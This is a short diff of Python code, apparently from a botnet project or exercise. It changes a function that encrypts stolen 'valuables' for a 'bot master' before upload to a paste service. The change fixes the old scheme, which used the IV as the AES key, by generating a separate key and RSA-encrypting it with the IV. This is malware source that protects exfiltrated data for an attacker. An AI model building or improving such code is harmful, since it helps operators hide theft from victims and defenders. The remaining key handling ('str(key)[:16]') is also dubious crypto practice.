@@ -29,16 +29,17 @@ def encrypt_for_master(data):
 
 
     iv = Random.get_random_bytes(AES.block_size)
-    aes_cipher = AES.new(str(iv)[:16], AES.MODE_CBC, iv)
+    key = Random.get_random_bytes(AES.block_size)
+    aes_cipher = AES.new(str(key)[:16], AES.MODE_CBC, iv)
 
     # padding the data to the appropriate size
     aes_encrypted_data = aes_cipher.encrypt(ANSI_X923_pad(data, AES.block_size))
 
     # using rsa to encrypt the iv that was used for AES
     # note that a tuple is returned so the first entry is what we want
-    rsa_encrypted_iv = masters_public_key.encrypt(iv, "")[0]
+    rsa_encrypted_aes_key = masters_public_key.encrypt(key + iv, "")[0]
 
-    return rsa_encrypted_iv + aes_encrypted_data + hashed_data;
+    return rsa_encrypted_aes_key + aes_encrypted_data + hashed_data;
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
